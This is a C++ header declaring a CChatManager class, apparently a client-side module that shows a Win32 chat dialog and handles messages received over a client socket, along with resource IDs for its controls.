#pragma once

#include "Manager.h"
#define IDI_ICON                        101
#define IDI_CHAT                        102
#define IDC_EDIT_CHATLOG                1000
#define IDC_EDIT_NEWMSG                 1001
#define IDC_BUTTON_SEND                 1002
#define IDC_BUTTON_END                  1003
class CChatManager : public CManager
{
public:
	CChatManager(CClientSocket* pClient);
	virtual ~CChatManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
private:
	HWND m_hWnd;
	static DWORD WINAPI MessageLoopProc(LPVOID lParam);
	static INT_PTR CALLBACK ChatDialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam);
};